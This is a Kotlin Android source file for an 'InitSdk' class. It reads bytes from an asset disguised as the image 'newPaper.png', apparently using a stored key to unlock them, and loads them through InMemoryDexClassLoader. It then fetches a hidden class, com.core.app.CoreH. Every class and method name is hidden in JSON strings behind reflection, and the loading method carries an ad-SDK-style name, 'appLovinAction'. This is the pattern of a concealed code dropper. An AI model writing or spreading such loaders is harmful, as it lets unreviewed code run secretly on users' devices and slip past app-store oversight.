package com.whisper.gentle.core

import android.content.Context
import com.whisper.gentle.zip.BaseInit
import org.json.JSONObject
import java.io.InputStream
import java.nio.ByteBuffer

/**
 * Date：2025/11/18
 * Describe:
 */

class InitSdk : BaseInit() {
    lateinit var mContext: Context
    private lateinit var json: JSONObject
    private val clazz2 by lazy {
        getClass(json.optString("str2"))
    }
//    {
//        "str1": "dalvik.system.InMemoryDexClassLoader",
//        "str2": "java.lang.ClassLoader",
//        "str3": "getClassLoader",
//        "str4": "com.core.app.CoreH",
//        "str5": "loadClass",
//        "str6": "345nuiizkjgasd12",
//        "name":"newPaper.png",
//    }

    fun fetchKey(): String {
        return json.optString("str6")
    }

    fun initJson(str: String) {
        json = JSONObject(str)
    }

    fun appLovinAction(byteBuffer: Any?): Any? {
//        val byteBuffer = ByteBuffer.wrap(code)
        //"dalvik.system.InMemoryDexClassLoader"
        val clazz = getClass(json.optString("str1")) ?: return null

        val constructor = clazz.getDeclaredConstructor(ByteBuffer::class.java, clazz2)

        val clazzLoader = mContext.javaClass.getMethod(json.optString("str3")).invoke(mContext)

        val classLoader = constructor.newInstance(byteBuffer, clazzLoader)

        return fet(classLoader, Pair(json.optString("str5"), "com.core.app.CoreH"))
    }

    override fun fetNameAssets(): ByteArray {
        val name = json.optString("name")
        val getAssetsMethod = mContext.javaClass.getMethod("getAssets")
        val assetManager = getAssetsMethod.invoke(mContext)
        val openMethod = assetManager.javaClass.getMethod("open", String::class.java)
        val r = openMethod.invoke(assetManager, name) as InputStream
        return r.readBytes()
    }
}
